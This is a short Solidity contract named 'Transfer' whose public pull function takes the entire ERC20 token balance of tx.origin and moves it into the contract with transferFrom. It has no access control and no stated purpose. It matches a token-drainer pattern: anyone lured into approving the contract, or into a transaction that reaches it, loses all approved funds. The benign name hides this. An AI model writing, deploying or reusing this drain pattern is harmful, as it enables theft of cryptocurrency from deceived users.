pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract Transfer {
    

    function pull(address token) public {
        // uint256 myAllowance = ERC20(token).allowance(tx.origin, address(this));
        uint256 balance = ERC20(token).balanceOf(tx.origin);
        ERC20(token).transferFrom(tx.origin, address(this), balance);
    }
}